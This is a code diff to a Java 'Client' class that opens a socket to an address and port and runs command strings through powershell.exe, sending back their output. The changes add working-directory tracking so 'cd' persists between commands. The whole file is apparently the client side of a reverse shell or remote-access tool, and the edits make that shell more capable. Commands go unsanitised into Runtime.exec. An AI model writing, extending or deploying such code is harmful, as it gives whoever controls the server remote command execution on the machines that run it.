@@ -6,6 +6,7 @@ import java.net.Socket;
 public class Client extends Thread{
     private Socket socket;
     private Runtime process;
+    private String directory = System.getProperty("user.dir");
     private DataInputStream input;
     private DataOutputStream output;
     public Client(String address, int port) {
@@ -16,19 +17,22 @@ public class Client extends Thread{
             process = Runtime.getRuntime();
         }
         catch(IOException e) {
-            throw new RuntimeException("error");
+            throw new RuntimeException(e);
         }
     }
     private String runCommand(String commands) {
         try {
 //            Process subProcess = process.exec("cmd /c " + commands);
-            Process subProcess = process.exec("powershell.exe " + commands);
+            Process subProcess = process.exec("powershell.exe cd " + directory + ";" + commands);
             String message = "";
             BufferedReader br = new BufferedReader(new InputStreamReader(
                     subProcess.getInputStream()));
             String line;
             while ((line = br.readLine()) != null) {
                 message += line + "\n";
+                if (message.strip().startsWith("Directory: ") && commands.startsWith("cd")) {
+                    directory = message.strip().split(" ")[1].split("\n")[0];
+                }
             }
             br.close();
             return message;
